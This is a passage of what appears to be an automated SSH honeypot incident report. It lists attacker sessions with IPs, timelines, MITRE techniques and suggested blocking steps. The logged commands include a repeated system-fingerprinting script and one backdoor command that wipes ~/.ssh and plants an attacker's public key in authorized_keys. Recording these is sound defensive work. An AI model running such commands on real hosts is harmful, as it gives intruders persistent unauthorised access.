| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 15:53:12` | `cowrie.session.connect` |
| `2026-07-06 15:53:12` | `cowrie.client.version` |
| `2026-07-06 15:53:12` | `cowrie.client.kex` |
| `2026-07-06 15:53:12` | `cowrie.login.success` |
| `2026-07-06 15:53:13` | `cowrie.direct-tcpip.request` |
| `2026-07-06 15:53:13` | `cowrie.direct-tcpip.data` |
| `2026-07-06 15:53:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6fa737970af

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 15:53 |
| **Last Seen** | 2026-07-06 15:53 |
| **Session Duration** | 22s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 15:53:37` | `cowrie.session.connect` |
| `2026-07-06 15:53:40` | `cowrie.client.version` |
| `2026-07-06 15:53:40` | `cowrie.client.kex` |
| `2026-07-06 15:53:51` | `cowrie.login.success` |
| `2026-07-06 15:53:54` | `cowrie.session.params` |
| `2026-07-06 15:53:54` | `cowrie.command.input` |
| `2026-07-06 15:53:54` | `cowrie.command.input` |
| `2026-07-06 15:53:54` | `cowrie.command.input` |
| `2026-07-06 15:53:54` | `cowrie.command.input` |
| `2026-07-06 15:53:54` | `cowrie.command.input` |
| `2026-07-06 15:53:54` | `cowrie.command.success` |
| `2026-07-06 15:53:54` | `cowrie.command.input` |
| `2026-07-06 15:53:54` | `cowrie.command.input` |
| `2026-07-06 15:53:54` | `cowrie.command.input` |
| `2026-07-06 15:53:54` | `cowrie.command.input` |
| `2026-07-06 15:53:57` | `cowrie.log.closed` |
| `2026-07-06 15:53:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1854f357d886

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 15:54 |
| **Last Seen** | 2026-07-06 15:55 |
| **Session Duration** | 24s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 15:54:43` | `cowrie.session.connect` |
| `2026-07-06 15:54:45` | `cowrie.client.version` |
| `2026-07-06 15:54:45` | `cowrie.client.kex` |
| `2026-07-06 15:54:58` | `cowrie.login.success` |
| `2026-07-06 15:55:02` | `cowrie.session.params` |
| `2026-07-06 15:55:02` | `cowrie.command.input` |
| `2026-07-06 15:55:02` | `cowrie.command.input` |
| `2026-07-06 15:55:02` | `cowrie.command.input` |
| `2026-07-06 15:55:02` | `cowrie.command.input` |
| `2026-07-06 15:55:02` | `cowrie.command.input` |
| `2026-07-06 15:55:02` | `cowrie.command.success` |
| `2026-07-06 15:55:02` | `cowrie.command.input` |
| `2026-07-06 15:55:02` | `cowrie.command.input` |
| `2026-07-06 15:55:02` | `cowrie.command.input` |
| `2026-07-06 15:55:02` | `cowrie.command.input` |
| `2026-07-06 15:55:05` | `cowrie.log.closed` |
| `2026-07-06 15:55:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-016d4d217abf

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 15:55 |
| **Last Seen** | 2026-07-06 15:56 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 15:55:52` | `cowrie.session.connect` |
| `2026-07-06 15:55:55` | `cowrie.client.version` |
| `2026-07-06 15:55:55` | `cowrie.client.kex` |
| `2026-07-06 15:56:07` | `cowrie.login.success` |
| `2026-07-06 15:56:09` | `cowrie.session.params` |
| `2026-07-06 15:56:09` | `cowrie.command.input` |
| `2026-07-06 15:56:09` | `cowrie.command.input` |
| `2026-07-06 15:56:09` | `cowrie.command.input` |
| `2026-07-06 15:56:09` | `cowrie.command.input` |
| `2026-07-06 15:56:09` | `cowrie.command.input` |
| `2026-07-06 15:56:09` | `cowrie.command.success` |
| `2026-07-06 15:56:09` | `cowrie.command.input` |
| `2026-07-06 15:56:09` | `cowrie.command.input` |
| `2026-07-06 15:56:09` | `cowrie.command.input` |
| `2026-07-06 15:56:09` | `cowrie.command.input` |
| `2026-07-06 15:56:09` | `cowrie.log.closed` |
| `2026-07-06 15:56:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a749c722d503

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 15:57 |
| **Last Seen** | 2026-07-06 15:57 |
| **Session Duration** | 24s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 15:57:08` | `cowrie.session.connect` |
| `2026-07-06 15:57:14` | `cowrie.client.version` |
| `2026-07-06 15:57:14` | `cowrie.client.kex` |
| `2026-07-06 15:57:26` | `cowrie.login.success` |
| `2026-07-06 15:57:32` | `cowrie.session.params` |
| `2026-07-06 15:57:32` | `cowrie.command.input` |
| `2026-07-06 15:57:32` | `cowrie.command.input` |
| `2026-07-06 15:57:32` | `cowrie.command.input` |
| `2026-07-06 15:57:32` | `cowrie.command.input` |
| `2026-07-06 15:57:32` | `cowrie.command.input` |
| `2026-07-06 15:57:32` | `cowrie.command.success` |
| `2026-07-06 15:57:32` | `cowrie.command.input` |
| `2026-07-06 15:57:32` | `cowrie.command.input` |
| `2026-07-06 15:57:32` | `cowrie.command.input` |
| `2026-07-06 15:57:32` | `cowrie.command.input` |
| `2026-07-06 15:57:32` | `cowrie.log.closed` |
| `2026-07-06 15:57:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ec6135e026c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 15:58 |
| **Last Seen** | 2026-07-06 15:58 |
| **Session Duration** | 20s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 15:58:18` | `cowrie.session.connect` |
| `2026-07-06 15:58:20` | `cowrie.client.version` |
| `2026-07-06 15:58:20` | `cowrie.client.kex` |
| `2026-07-06 15:58:29` | `cowrie.login.success` |
| `2026-07-06 15:58:33` | `cowrie.session.params` |
| `2026-07-06 15:58:33` | `cowrie.command.input` |
| `2026-07-06 15:58:33` | `cowrie.command.input` |
| `2026-07-06 15:58:33` | `cowrie.command.input` |
| `2026-07-06 15:58:33` | `cowrie.command.input` |
| `2026-07-06 15:58:33` | `cowrie.command.input` |
| `2026-07-06 15:58:33` | `cowrie.command.success` |
| `2026-07-06 15:58:33` | `cowrie.command.input` |
| `2026-07-06 15:58:33` | `cowrie.command.input` |
| `2026-07-06 15:58:33` | `cowrie.command.input` |
| `2026-07-06 15:58:33` | `cowrie.command.input` |
| `2026-07-06 15:58:36` | `cowrie.log.closed` |
| `2026-07-06 15:58:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0025f4f6a881

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-06 15:58 |
| **Last Seen** | 2026-07-06 15:59 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 15:58:59` | `cowrie.session.connect` |
| `2026-07-06 15:59:01` | `cowrie.client.version` |
| `2026-07-06 15:59:01` | `cowrie.client.kex` |
| `2026-07-06 15:59:07` | `cowrie.login.success` |
| `2026-07-06 15:59:10` | `cowrie.session.params` |
| `2026-07-06 15:59:10` | `cowrie.command.input` |
| `2026-07-06 15:59:12` | `cowrie.log.closed` |
| `2026-07-06 15:59:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7cd8ff03974

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 15:59 |
| **Last Seen** | 2026-07-06 15:59 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 15:59:32` | `cowrie.session.connect` |
| `2026-07-06 15:59:33` | `cowrie.client.version` |
| `2026-07-06 15:59:33` | `cowrie.client.kex` |
| `2026-07-06 15:59:43` | `cowrie.login.success` |
| `2026-07-06 15:59:51` | `cowrie.session.params` |
| `2026-07-06 15:59:51` | `cowrie.command.input` |
| `2026-07-06 15:59:51` | `cowrie.command.input` |
| `2026-07-06 15:59:51` | `cowrie.command.input` |
| `2026-07-06 15:59:51` | `cowrie.command.input` |
| `2026-07-06 15:59:51` | `cowrie.command.input` |
| `2026-07-06 15:59:51` | `cowrie.command.success` |
| `2026-07-06 15:59:51` | `cowrie.command.input` |
| `2026-07-06 15:59:51` | `cowrie.command.input` |
| `2026-07-06 15:59:51` | `cowrie.command.input` |
| `2026-07-06 15:59:51` | `cowrie.command.input` |
| `2026-07-06 15:59:53` | `cowrie.log.closed` |
| `2026-07-06 15:59:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-445e2f81cbe5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 16:00 |
| **Last Seen** | 2026-07-06 16:00 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 16:00:42` | `cowrie.session.connect` |
| `2026-07-06 16:00:43` | `cowrie.client.version` |
| `2026-07-06 16:00:43` | `cowrie.client.kex` |
| `2026-07-06 16:00:50` | `cowrie.login.success` |
| `2026-07-06 16:00:52` | `cowrie.session.params` |
| `2026-07-06 16:00:52` | `cowrie.command.input` |
| `2026-07-06 16:00:52` | `cowrie.command.input` |
| `2026-07-06 16:00:52` | `cowrie.command.input` |
| `2026-07-06 16:00:52` | `cowrie.command.input` |
| `2026-07-06 16:00:52` | `cowrie.command.input` |
| `2026-07-06 16:00:52` | `cowrie.command.success` |
| `2026-07-06 16:00:52` | `cowrie.command.input` |
| `2026-07-06 16:00:52` | `cowrie.command.input` |
| `2026-07-06 16:00:52` | `cowrie.command.input` |
| `2026-07-06 16:00:52` | `cowrie.command.input` |
| `2026-07-06 16:00:54` | `cowrie.log.closed` |
| `2026-07-06 16:00:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17ab63a45d17

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 16:01 |
| **Last Seen** | 2026-07-06 16:02 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 16:01:51` | `cowrie.session.connect` |
| `2026-07-06 16:01:54` | `cowrie.client.version` |
| `2026-07-06 16:01:54` | `cowrie.client.kex` |
| `2026-07-06 16:01:59` | `cowrie.login.success` |
| `2026-07-06 16:02:01` | `cowrie.session.params` |
| `2026-07-06 16:02:01` | `cowrie.command.input` |
| `2026-07-06 16:02:01` | `cowrie.command.input` |
| `2026-07-06 16:02:01` | `cowrie.command.input` |
| `2026-07-06 16:02:01` | `cowrie.command.input` |
| `2026-07-06 16:02:01` | `cowrie.command.input` |
| `2026-07-06 16:02:01` | `cowrie.command.success` |
| `2026-07-06 16:02:01` | `cowrie.command.input` |
| `2026-07-06 16:02:01` | `cowrie.command.input` |
| `2026-07-06 16:02:01` | `cowrie.command.input` |
| `2026-07-06 16:02:01` | `cowrie.command.input` |
| `2026-07-06 16:02:02` | `cowrie.log.closed` |
| `2026-07-06 16:02:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-28a9b81a0075

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 16:02 |
| **Last Seen** | 2026-07-06 16:03 |
| **Session Duration** | 22s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 16:02:56` | `cowrie.session.connect` |
| `2026-07-06 16:02:59` | `cowrie.client.version` |
| `2026-07-06 16:02:59` | `cowrie.client.kex` |
| `2026-07-06 16:03:08` | `cowrie.login.success` |
| `2026-07-06 16:03:11` | `cowrie.session.params` |
| `2026-07-06 16:03:11` | `cowrie.command.input` |
| `2026-07-06 16:03:11` | `cowrie.command.input` |
| `2026-07-06 16:03:11` | `cowrie.command.input` |
| `2026-07-06 16:03:11` | `cowrie.command.input` |
| `2026-07-06 16:03:11` | `cowrie.command.input` |
| `2026-07-06 16:03:11` | `cowrie.command.success` |
| `2026-07-06 16:03:11` | `cowrie.command.input` |
| `2026-07-06 16:03:11` | `cowrie.command.input` |
| `2026-07-06 16:03:11` | `cowrie.command.input` |
| `2026-07-06 16:03:11` | `cowrie.command.input` |
| `2026-07-06 16:03:14` | `cowrie.log.closed` |
| `2026-07-06 16:03:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd2469eb4d8e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 16:04 |
| **Last Seen** | 2026-07-06 16:04 |
| **Session Duration** | 24s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 16:04:11` | `cowrie.session.connect` |
| `2026-07-06 16:04:14` | `cowrie.client.version` |
| `2026-07-06 16:04:14` | `cowrie.client.kex` |
| `2026-07-06 16:04:25` | `cowrie.login.success` |
| `2026-07-06 16:04:30` | `cowrie.session.params` |
| `2026-07-06 16:04:30` | `cowrie.command.input` |
| `2026-07-06 16:04:30` | `cowrie.command.input` |
| `2026-07-06 16:04:30` | `cowrie.command.input` |
| `2026-07-06 16:04:30` | `cowrie.command.input` |
| `2026-07-06 16:04:30` | `cowrie.command.input` |
| `2026-07-06 16:04:30` | `cowrie.command.success` |
| `2026-07-06 16:04:30` | `cowrie.command.input` |
| `2026-07-06 16:04:30` | `cowrie.command.input` |
| `2026-07-06 16:04:30` | `cowrie.command.input` |
| `2026-07-06 16:04:30` | `cowrie.command.input` |
| `2026-07-06 16:04:32` | `cowrie.log.closed` |
| `2026-07-06 16:04:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b07e58887af

| Field | Detail |
|---|---|
| **Source IP** | `118.193.45[.]134` |
| **First Seen** | 2026-07-06 16:04 |
| **Last Seen** | 2026-07-06 16:04 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 16:04:51` | `cowrie.session.connect` |
| `2026-07-06 16:04:51` | `cowrie.client.version` |
| `2026-07-06 16:04:51` | `cowrie.client.kex` |
| `2026-07-06 16:04:52` | `cowrie.login.success` |
| `2026-07-06 16:04:53` | `cowrie.session.params` |
| `2026-07-06 16:04:53` | `cowrie.command.input` |
| `2026-07-06 16:04:53` | `cowrie.command.failed` |
| `2026-07-06 16:04:54` | `cowrie.log.closed` |
| `2026-07-06 16:04:54` | `cowrie.session.params` |
| `2026-07-06 16:04:54` | `cowrie.command.input` |
| `2026-07-06 16:04:55` | `cowrie.session.file_download` |
| `2026-07-06 16:04:55` | `cowrie.log.closed` |
| `2026-07-06 16:04:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.45[.]134` to AbuseIPDB if not already reported
- [ ] Block `118.193.45[.]134` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b27053cb21e

| Field | Detail |
|---|---|
| **Source IP** | `118.193.45[.]134` |
| **First Seen** | 2026-07-06 16:04 |
| **Last Seen** | 2026-07-06 16:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 16:04:55` | `cowrie.session.connect` |
| `2026-07-06 16:04:55` | `cowrie.client.version` |
| `2026-07-06 16:04:55` | `cowrie.client.kex` |
